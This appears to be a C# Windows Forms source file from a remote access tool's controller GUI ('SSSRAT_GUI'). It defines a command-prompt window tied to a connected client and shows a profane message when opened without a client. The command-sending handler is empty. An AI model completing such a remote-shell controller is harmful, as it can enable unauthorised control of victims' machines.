using System;
using System.Windows.Forms;
using Public;

namespace SSSRAT_GUI {
	public partial class FrmCMD : Form {
		public FrmCMD() {
			InitializeComponent();
		}

		public static Client? client = null;

		public void Init(Client Client) {
			client = Client;
			Text = "CMD (" + Client.tcp.Client.RemoteEndPoint + ")";
		}

		private void FrmCMDLoad(object sender, EventArgs e) {
			if (client == null) {
				//hax
				MessageBox.Show("try to cheat me again motherfucker",
								_.PROGRAM_NAME, //????????
				                MessageBoxButtons.OK,
				                MessageBoxIcon.Error);
				Environment.Exit(0);
			}
		}

		private void TCMDKeyUp(object sender, KeyEventArgs e) {
			if (e.KeyCode == Keys.Enter && client != null) {
				
			}
		}
	}
}
